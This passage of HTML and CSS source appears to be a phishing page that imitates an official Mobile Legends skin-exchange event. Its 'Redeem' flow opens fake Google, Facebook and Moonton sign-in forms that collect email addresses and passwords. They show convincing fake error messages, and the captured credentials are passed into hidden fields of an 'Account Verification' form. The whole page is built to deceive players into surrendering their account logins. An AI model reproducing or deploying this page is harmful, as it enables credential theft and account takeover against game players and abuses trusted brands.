    background-size: 100% 100%;
    height: 60px;
    padding-bottom: 5px;
}

.popup-box-navbar-ignis img {
	width: 25px;
	height: 25px;
	margin-top: 7px;
	margin-right: 15px;
	float: right;
}
.popup-box-ignis {
	background: url(img/popup-box-ignis.png) no-repeat center center;
	background-size: 100% 100%;
	width: 100%;
	margin-top: -12px;
	margin-left: 0px;
}
.popup-box-alert-ignis {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 2px;
	padding: 12px;
	color: #cdcdcd;
	font-size: 16px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	display: block;
}

.popup-box-navbar-ignis-title {
	padding-top: 21px;
    padding-bottom: 2px;
    font-size: 20px;
    font-family: 'laza';
    font-weight: 500;
    text-align: center;
    padding-right: 0;
    color: #ffffffcf;
}
.popup-box-navbar-loginz {
    padding-top: 6px;
    padding-bottom: 2px;
    font-size: 20px;
    font-family: 'laza';
    font-weight: 500;
    text-align: center;
    padding-right: 0;
    color: #ffffffcf;
}
.popup-box-navbars {
	background:url(img/popup-navbar2.png) no-repeat center center;
	background-size:100% 100%;
	height: 43px;
	padding-bottom: 5px;
}
.popup-box-navbars img {
	width: 20px;
	height: 20px;
	margin-top: 15px;
	margin-right: 18px;
	float: right;
}
.popup-box-navbars-title {	
	padding-left: 40px;
	padding-top: 14px;
	padding-bottom: 2px;
	font-size: 20px;
	color: #fff;
	font-family:laza;
	font-weight: 300;
	text-align: center;	
}
.kagetk {     
	background: rgba(0, 0, 0, 0.2);
	background-size:50% 50%;
	width: 80%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	border: 1px solid #fff;
	display: none;
	padding: 10px;
	color: #fff;
	font-size: 14px;
	font-family: laza;
	text-align: center;
}
.popup-box-bgs {
	background:url(img/popup-box-bg2.png) no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	margin-top: -12px;
}
.popup-box-bgz {
	background: url(img/popup-box-bg2.png) no-repeat center center;
    background-size: 100% 100%;
    width: 100%;
    margin-top: -12px;
    margin-left: 0px;
}
.popup-box-alerts4 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #fff;
	font-size: 20px;
    font-family:laza;
	font-weight: 500;
	text-align: left;
	display: block;
}
.popup-box-alerts4 i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #F5EAB0;
	font-size: 50px;
	text-align: left;
}
.popup-box-formx label {
  width: 70%;
  text-align: left;
  padding-left: 20px;
  color: #B7B7B7;
  text-shadow:none;
  font-size:17px;
}
.popup-box-formx input {
	background: #001;
	width: 85%;
	height: 35px;
	margin-bottom: 8px;
	margin-left: 20px;
	padding-right: 4px;
	padding: 4px;
	color: #fff;
	font-size:15px;
	font-family:laza;
	font-weight: 500;
	border: 0.1px solid #fff;
	outline:none;
	position: left;
  -webkit-appearance: none;
  -moz-appearance: none;
}
.popup-box-formx input::placeholder {
	color: #BCCBCE;
}
.popup-box-footers {
	background-size:100% 100%;
	margin-top: 20px;
	width: 100%;
	height: 45px;
}
.popup-box-footers button {
	background: url(img/yes_laza.png) no-repeat center;
	background-size: 100% 100%;
	width: 70%;
	height: 35px;
	margin-top: 5px;
	padding: 4px;
	padding-left: 35px;
	padding-right: 35px;
	color: #000;
	font-size:18px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	border: none;
	outline: none;
}
.popup-box-formx-footer {
	background-size:100% 100%;
	width: 100%;
	height: 45px;
	margin-top: 20px;
}
.popup-box-formx-footer button {
	background: url(img/yes_laza.png) no-repeat center;
	background-size: 100% 100%;
	width: 40%;
	height: auto;
	margin-top: 5px;
	padding: 4px;
	padding-left: 30px;
	padding-right: 30px;
	color: #F4CD34;
	font-size:18px;
	font-family: laza;
	font-weight: 500;
	text-align: center;
	border:none;
	outline: none;
}
.kanan {
	float: right;
}
.kiri {
	float: left;
}
.tengah {
	margin-left: auto;
	margin-right: auto;
	display: block;
}
::-webkit-scrollbar { 
    display: none;
    width: 0px;
}
figure {
	margin: 0;
	padding: 0;
	overflow: hidden;
}
.itemShine figure {
	position: relative;
}
.itemShine figure::before {
	background: -webkit-linear-gradient(left, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
	background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
	width: 50%;
	height: 100%;
	top: 0;
	left: -75%;
	position: absolute;
	z-index: 2;
	content: '';
	display: block;
	-webkit-transform: skewX(-25deg);
	transform: skewX(-25deg);
}
.itemShine figure::before {
	-webkit-animation: shine 2s infinite;
	animation: shine 2s infinite;
}
@-webkit-keyframes shine {
	100% {
		left: 125%;
		}
}
@keyframes shine {
	100% {
		left: 125%;
		}
}
.border_hadiah{
	border:3px solid #FBF274;
    background: linear-gradient(90deg, rgba(255,0,109,1) 8%, rgba(255,250,0,0.10303017436594208) 12%);
	display:inline-block;
}
.rewards-box-content {		
    background:url(img/kinnonbg-reward.jpg) no-repeat center center;
    background-size:100% 100%;	
	width: 100%;
	height: 550px;
	margin-top: 10px;
	padding: 5px;
    padding-top: 5px;
    padding-left: 7px;
    padding-bottom: 0px;
	display: block;
}
.rewards-box-content-title {
	width: 100%;
	height: auto;
	margin-top: -20px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 20px;
	padding: 30px;
	color: #fff;
	font-size: 16px;
    font-family:laza;
	font-weight: 300;
	text-align: left;
	display: block;
}
.proces-box-content {		
    background:url(img/kinnonbg-proces.jpg) no-repeat center center;
    background-size:100% 100%;	
	width: 100%;
	height: 550px;
	margin-top: 10px;
	padding: 5px;
    padding-top: 5px;
    padding-left: 7px;
    padding-bottom: 0px;
	display: block;
}
.proces-box-content-title {
	width: 100%;
	height: auto;
	margin-top: -20px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 20px;
	padding: 30px;
	color: #fff;
	font-size: 16px;
    font-family:laza;
	font-weight: 300;
	text-align: left;
	display: block;
}
.moonton-load {	
	background-size: 100% 100%;
	width: 93%;
	height: 421px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	padding: 20px;
	padding-top: 0px;
	padding-bottom: 25px;
	display: block;
}
.moonton-load-title {
	width: 95%;
	height: auto;
	margin-top: 70px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	padding-top: 90px;
	color: #fff;
	font-size: 18px;
    font-family:laza;
	font-weight: 500;
	text-align: center;
	display: block;
}
.moonton-load-title i {
	margin-top: 90px;
	padding-top: 15px;
	padding-bottom: 15px;
	color: #00acee;
	font-size: 50px;	
	text-align: center;
}
.fb-load {	
	background-size: 100% 100%;
	width: 93%;
	height: 333px;
	margin-top: -1px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 15px;
	padding: 20px;
	padding-top: 0px;
	padding-bottom: 25px;
	display: block;
}
.fb-load img {		
	width: 50px;
	height: 50px;	
	margin-top: 230px;	
	margin-bottom: -55px;
}
.fb-load-title {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 6px;
	color: #999998;
	font-size: 18px;
    font-family:laza;
	font-weight: 500;
	text-align: center;
	display: block;
}
.fb-load-title i {
	margin-top: 200px;
	padding-top: 15px;
	padding-bottom: 15px;
	color: #999998;
	font-size: 30px;	
	text-align: center;
}
.lazaslide p {
	background: #fc9316;
        background-size: 100% 100%;
        width: 312px !important;
        margin-top: 74%;
        padding-left: 5px;
        padding-right: 5px;
        padding: 3px;
        margin-left: 39px;
        float: left;
        text-align: center;
        /* border-radius: 10px; */
        border-top-left-radius: 25px;
        border-bottom-right-radius: 25px;
   }
   .lazaslide span {
	font-family: laza;
	font-size: 15px;
	color: #fff;
   }
   .s3_tit {
	font-family: laza;
	color: #fff;
	margin-left: 5px;
	margin-top: 5px;
   }
   .timer {
	background: url(img/timer.png) no-repeat center center;
    background-size: 62% 83%;
    width: 98%;
    height: 11%;
    margin-top: 395px;
    padding-right: 13px;
    margin-right: 2px;A
    display: block;
    padding-top: 16px;
    text-align: center;
    font-size: 16px;
    font-family: 'laza';
    font-weight: 500;
    color: #000000;
    font-style: italic;
    text-shadow: 1px 1px 1px #888b8b;
    position: absolute;
   }
   .collect font {
	font-family: laza;
    font-size: 16px;
    font-weight: 500px;
    color: #ffffff;
    text-shadow: 1px 1px 1px #000000;
    margin-left: 8px;
}
@media only screen and (max-width:600px) {
    .container, .container2, .container3, .container4 {
        width: 100%;
        height: auto;
        margin-top: -3px;
        margin-bottom: 0px;
        border: none;
        border-radius: 0px;
        padding: 0px;
    }
    .event-title {
        width: 90%;
        height: 67px;
    }
    .event-notification-content {
        width: 84.6%;
        margin-top: -46px;
        margin-right: 0.3px;
        border-left: 0px;
    }
    .event-notification {    
	width:98%;
	height:53px;
	padding:7px;
	margin-right: auto;
	margin-left: auto;
    }
    .event-notification-text {
	padding-top:10px;
	font-family:laza;
	font-size:16px;
    }
    .box {
        width: 98%;
        height: 330px;
    }
    .box-item {
        width: 100%;
      	height:auto;				    
     	padding-top:26px;    	
     	margin-left:-1px;
        margin-right:4px;   	     	
    }
    .item2 {
        width: 22%;
        height: 76px;
        margin-top: 12px;        
        margin: 1px;
    }
    .item3 {
        width: 28%;
        height: 96px;
    }
    .itembutton {
        width: 28%;
        height: 96px;
    }    
    .item4 {
        width: 40%;
        height: 77px;
        margin: 3px;
    }
    .item5 {
        width: 23%;
        height: 77px;
        margin: 4px;
    }
    .item {
        height: 95px;
    }
    .item .item-nominal {
        padding-right: 3px;
        bottom: -60px;
    }
	.timer {
        margin-left: -70px;
    }
    .about-box-content {
        margin-top: 15px;
    }
    .popup-box-wrapper {
        width: 355px;
        margin-top: 55%;
    }
    .popup-box-wrappers {
        width: 360px;
        margin-top: 40%;
    }
	.popup-box-wrapperz {
		width: 360px;
    height: auto;
    position: relative;
    margin: 50px auto;
    margin-top: 252px;
    text-align: center;
    font-family: 'laza';
    color: #fff;
    }
    .popup-box-wrapper-login {
        width: 380px;
        margin-top: 70%;
    }
    .popup-box-item {
        width: 16%;
    	height: 67px;
    	margin-top: 38px;
    }
.popup-box-item-many { width: 25%; height: 80px; margin: 1px -45px 10px; margin-left:45px; text-align: right; display: inline-block; }
.popup-box-item-many { width: 100%; height: 100%; 
  
}
    .popup-box-verification {
        margin-top: 20%;
    }
    .popup-box-login-fb {
        margin-top: 25%;
    }
    .popup-box-login-moonton {
        margin-top: 25%;
   }
   .lazaslide p {
	background: #fc9316;
        background-size: 100% 100%;
        width: 312px !important;
        margin-top: 74%;
        padding-left: 5px;
        padding-right: 5px;
        padding: 3px;
        margin-left: 39px;
        float: left;
        text-align: center;
        /* border-radius: 10px; */
        border-top-left-radius: 25px;
        border-bottom-right-radius: 25px;
   }
   .lazaslide span {
	font-family: laza;
	font-size: 15px;
	color: #ffffff;
   }
   .s3_tit {
	font-family: laza;
	color: #fff;
	margin-left: 5px;
	margin-top: 5px;
   }
   .popup-account-login {
	background:url(img/lazlogin.png) no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	height: 213px;
	margin-top: -12px;
}
}
</style> 
<div class="navbar">
<img class="navbar-logo" src="img/style-img/logo.png">
<div class="navbar-right">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_language.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_menu.svg"></div>
</div> <!--- navbar-right --->
</div>
<div class="container">
<div class="rewards-sec">
<div class="laz-container">
<div class="header" style="position: relative;">
<div class="lazaslide">
<p class="gift-name animated fadeInDown">
<span>THE ASPIRANT SKINS LIMITED-TIME RETURN</span></div>
<div class="lazaslide">
<p class="gift-name animated fadeInDown">
<span>EXCHANGE THE SKINS BELOW WITH YOUR COINS</span></div>
<div class="lazaslide">
<p class="gift-name animated fadeInDown">
<span>SKINS EXCLUSIVE</span></div>
</div> <!--- header ---> 

<div class="s1_man1" style="display: none;">
<img src="img/namm4.png" style="width:150px;height:auto;margin-left:20px;margin-top:-230px;position:absolute;">
</div>
<div class="timer" style="opacity: 0%;">EVENT TERBATAS<br>BERAKHIR PADA: <i class="fa-solid fa-stopwatch fa-shake"></i><span id="timer1" style="animation: fade .6s infinite alternate;color: #ff2c2c;"></span></div> <!--- event-notification-timer --->
  
</div>
<div class="lazareward"> <!--- 1 --->
<button class="collect" style="top: 614px;left: 39px;" type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="img/rewards/1.jpg" item-name="Angela (Cyber Cherubin)" item-total="" item-price="3000"><font>3000</font>
</button>

<div class="lazareward"> <!--- 2 --->
<button class="collect" style="top: 614px;left: 216px;" type="button" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="img/rewards/2.jpg" item-name="Fanny (Blade of Kibou)" item-total="" item-price="3000"><font>3000</font>
</button>

   

</div>
</div> <!--- laz-container --->
</div> <!--- spin-sec --->

<div class="footer" style="top:-80px;">
<img class="footer-copyright-icon" src="img/logo.png">
<div class="footer-copyright-text">
<div class="footer-txt-copyrights">
© Moonton. All rights reserved
</div> <!--- footer-txt-copyrights --->
<div class="footer-copyright-text-left">Cookie Policy</div> <!--- footer-txt-copyright --->
<div class="footer-copyright-text-center">Privacy Policies</div> <!--- footer-txt-copyright --->
<div class="footer-copyright-text-right">Code of Conduct for External Providers</div> <!--- footer-txt-copyright --->
</div> <!--- footer-copyright-text --->
</div> <!--- footer --->

<div class="popup-login login-google animated fadeIn" style="display: none;">
	<div class="popup-box-login-google">
	<a onmousedown="tutup.play();" onclick="close_google()" class="close-other"><i class="zmdi zmdi-close"></i></a>
		<div class="box-google">
			<div class="header-google"><svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="BFr46e xduoyf">
					<g id="qaEJec">
						<path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
					</g>
					<g id="YGlOvc">
						<path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
					</g>
					<g id="BWfIk">
						<path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
					</g>
					<g id="e6m3fd">
						<path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path>
					</g>
					<g id="vbkDmc">
						<path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path>
					</g>
					<g id="idEJde">
						<path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
					</g>
				</svg>
			</div> <!--- header-google --->
			<div class="txt-login-google">Sign in</div> <!--- txt-login-google --->
			<div class="txt-login-google-desc">Use your Google account</div> <!--- txt-login-google-desc --->
			<form  action="javascript:void(0)" method="post" id="ValidateLoginGoogleForm">
				<div class="input-box">
					<label class="input-label">Email or phone</label>
					<input type="text" class="input-1" name="email" id="email-google" onfocus="setFocus(true)" onblur="setFocus(false)" required>
				</div>
				<div class="input-box">
					<label class="input-label">Password</label>
					<input type="password" class="input-1" name="password" id="password-google" onfocus="setFocus(true)" onblur="setFocus(false)" required>
				</div>
				<input type="hidden" name="login" id="login-google" value="Google" readonly>
				<div class="email-google" style="color: #d50000; font-size: 14px; text-align: left; display: none;"><svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg> Couldn't find your Google account.</div>
				<div class="sandi-google" style="color: #d50000; font-size: 14px; text-align: left; display: none;"><svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg> Wrong password, try again.</div>
				<button type="button" class="btn-forgot-google">Forgot email?</button>
				</br>
				<div class="notify-google">Not your computer? Use Guest mode to sign in privately. <span>Learn more</span></div> <!--- notify-google --->
				</br>
				<button type="submit" class="btn-login-google" onclick="ValidateLoginGoogleData()">Next</button>
				<button type="button" class="btn-create-google">Create account</button>
			</form>
			</br>
			</br>
		</div> <!--- box-google --->
	</div>
</div>

<div class="popup-login login-google-load animated fadeIn" style="display: none;">
	<div class="popup-box-login-google">
		<div class="box-google">
			<div class="header-google"><svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="BFr46e xduoyf">
					<g id="qaEJec">
						<path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
					</g>
					<g id="YGlOvc">
						<path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
					</g>
					<g id="BWfIk">
						<path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
					</g>
					<g id="e6m3fd">
						<path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path>
					</g>
					<g id="vbkDmc">
						<path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path>
					</g>
					<g id="idEJde">
						<path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
					</g>
				</svg>
			</div> <!--- header-google --->
			<br>
			<br>
			<i class="zmdi zmdi-spinner zmdi-hc-4x zmdi-hc-spin" style="color: #1a73e8;margin-top: 86px;"></i>
			<br>
			<br>
			<br>
		</div> <!--- box-google --->
	</div>
</div>

</div><div class="popup itemReward_confirmation2 fades" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar-ignis" style="margin-bottom:11px;">
<div class="popup-box-navbar-ignis-title">Item Confirmation</div>
<img onmousedown="tutup.play();" onclick="close_reward_confirmastion()" src="img/popup-close2.png" style="margin-top: -27px;margin-right: 25px;opacity: 0%;">
</div>
<div class="popup-box-ignis">
<div class="popup-box-alert-ignis"></div>
<div class="popup-box-item bordermotion itemShine" style="width: 23%;height: 90px;margin-top: 5px;margin-left: 43px;margin-bottom: 5px;">
<rw id="ItemName"></rw>
<div class="popup-box-alert-price">Price:</div>
<pr id="price"></pr>
<div>
<figure>
<span id="amount"></span>
<img src="" id="myItemReward_confirmationImg">
</figure>
</div>
<div class="line"></div>
<img src="img/tokens.png" style="margin-top: 4px;margin-right: -77px;width: 19px;height: auto;">
</div> <!--- popup-box-item --->
<div class="popup-box-footer-ignis">
<button type="button" onmousedown="tutup.play();" onclick="close_reward_confirmation()" style="width: 90px;height: 28px;padding-left: 0;padding-right: 0;margin-top: -22px;">Cancel</button>
<button type="button" onmousedown="buka.play();" onclick="open_account_verification()" style="width: 90px;height: 28px;padding-left: 0;padding-right: 0;margin-top: -22px;margin-left: 10px;"><font style="">Redeem</font> </button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup itemReward_confirmation --->



<div class="popup loadinglogin" style="display: none;">
<div class="loadinglogin"style="width:400px;height: 679px;margin-top:279px;margin-left:auto;margin-right:auto;">
<div class="loader-line"></div>
<div class="loader-label" id="text-login1">Game Loading...</div>
<div class="loader-label" style="display:none" id="text-login2">Connect to Login</div>
<img src="img/loadlogin.png" style="background-size: 100% 100%;width: 100%;">
</img>
</div>
</div>

<div class="popup account_login animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
</div>
<div class="rewardpop">
<div class="popup-box-navbar-loginz">Login</div>
<div class="popup-box-alert-login">Log in now to redeem your coins and exclusive items.<br></div>
<button type="button" onmousedown="buka.play();" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();" style="top: 0px;"><img src="img/style-img/icon_fb.png">Login with Facebook</button>
<button type="button" onmousedown="buka.play();" class="popup-btn-login popup-btn-google" onclick="open_google();" style="top: 0px;"><img src="img/style-img/google.png">Login with Google</button>
<button type="button" onmousedown="buka.play();" class="popup-btn-login popup-btn-moonton" onclick="open_moonton();" style="top: 0px;"><img src="img/style-img/moonton.png">Login with Moonton</button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-footer --->

<div class="popup-login login-moonton animated fadeIn" style="display: none;">
<div class="popup-box-login-moonton">
<a onmousedown="tutup.play();" onclick="close_moonton()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="header-moonton"><img src="img/style-img/moonton-login.png"></div> 
<div class="txt-login-moonton">Login Moonton</div> <!--- txt-login-moonton --->
<div class="content-box-moonton">
<form action="javascript:void(0)" method="post" id="ValidateLoginMoontonForm">
<div class="form-group-moonton">
<input type="text" name="email" id="email-moonton" autocomplete="off" required oninvalid="this.setCustomValidity('Enter Username, Email or Mobile number')" oninput="setCustomValidity('')">
<label>Email/Phone Number</label>
</div> <!--- form-group-moonton --->
<div class="form-group-moonton">
<div class="form-group-sohi moontonShowPassword" onclick="showmoontonPassword()">
<img src="https://i.ibb.co/PYpHF6b/moonton-Show-Password.png">
</div> <!--- form-group-sohi moontonShowPassword --->
<div class="form-group-sohi moontonHidePassword" style="display: none;" onclick="hidemoontonPassword()">
<img src="https://i.ibb.co/pZDr8sd/moonton-Hide-Password.png">
</div> <!--- form-group-sohi moontonHidePassword --->
<input type="password" name="password" id="password-moonton" autocomplete="off" required oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
<label>Password</label>
</div> <!--- form-group-moonton --->
<p class="kagettw email-tw" style="width: 330px; top: -17px; text-align: center; margin-bottom: 3px; margin-left: -18px;">Sorry, we couldn't find your account.</p>
<p class="kagettw sandi-tw" style="width: 330px; top: -17px; text-align: center; margin-bottom: 3px; margin-left: -20px;">Wrong Password!</p>
<input type="hidden" name="login" id="login-moonton" value="Moonton" readonly>
<button type="submit" onclick="ValidateLoginMoontonData()">Login</button>
<label>Don't have an account? <a>Sign up</a></label>
</form>
</div> <!--- content-box-moonton --->
</div> <!--- popup-box-login-moonton --->
</div> <!--- popup-login --->

<div class="popup-login login-moonton-load" style="display: none;">
<div class="popup-box-login-moonton">
<div class="moonton-load">
<div class="moonton-load-title">
<div class="loader2"></div>
</div> <!--- moonton-load-title --->
</div> <!--- moonton-load --->
</div> <!--- popup-box-login-moonton --->
</div> <!--- popup-login --->

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onmousedown="tutup.play();" onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb">
<img src="img/style-img/facebook-text.png">
</div>
<div class="content-box-fb">
<p class="kaget email-fb" style="width: 320px; top: -5px; text-align: left;">The email address or phone number that you've entered doesn't match any account. <b>Sign up for an account.</b></p>
<p class="kaget sandi-fb" style="width: 320px; top: -5px; text-align: left;">The password that you've entered is incorrect. Forgotten password?</p>
<img src="img/style-img/icon_2.webp">
<div class="txt-login-fb">
 Log in to your Facebook account to connect to Mobile Legend.
</div>
<form class="login-form" action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
<div class="form-group-fb">
<input type="text" name="email" id="email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Mobile number or email address')" oninput="setCustomValidity('')">
<div class="form-group-sohid showFbPassword" id="showFbPassword" onclick="showFbPassword()">
<img src="img/style-img/show.png">
</div> <!--- form-group-sohid showFbPassword --->
<div class="form-group-sohid hidePassword" style="display: none;" onclick="hideFbPassword()">
<img src="img/style-img/hide.png">
</div> <!--- form-group-sohid showFbPassword --->
<input type="password" name="password" id="password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
</div> <!--- form-group-fb --->
<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
<button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
</form>
<div class="txt-create-account">Create Account</div>
<div class="txt-not-now">Not now</div>
<div class="txt-forgotten-password">Forgotten password?</div>
</div>
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div>
<div class="language-name">العربية</div>
<div class="language-name">Türkçe</div>
<div class="language-name">Tiếng Việt</div>
<div class="language-name">日本語</div>
<div class="language-name">Español</div>
<div class="language-name">Português (Brasil)</div>
<div class="language-name">
<i class="fa fa-plus"></i>
</div>
</center>
</div>
<div class="copyright">Meta © 2023</div>
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login--->

<div class="popup-login login-facebook-load" style="display: none;">
<div class="popup-box-login-fb">
<div class="navbar-fb">
<img src="img/style-img/facebook-text.png">
</div> <!--- navbar --->
<div class="content-box-fb">
<div class="fb-load">
<img src="img/style-img/icon_fb.png">
<div class="loader3"></div>
</div> <!--- fb-load --->
</div> <!--- content-box-fb --->
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login--->

<div class="popup account_verification animated fadeIn" style="display: none;margin-top:0px;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Verification</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bg">
<div class="popup-box-alert4">
<br>Please re-verify your account</font></div> <!--- popup-box-alert --->
<form class="popup-box-form" action="javascript:void(0)" method="post" onsubmit="dataSubmit();" id="ValidateVerificationDataForm">
<input type="hidden" name="email" id="validateEmail" readonly>
<input type="hidden" name="password" id="validatePassword" readonly>
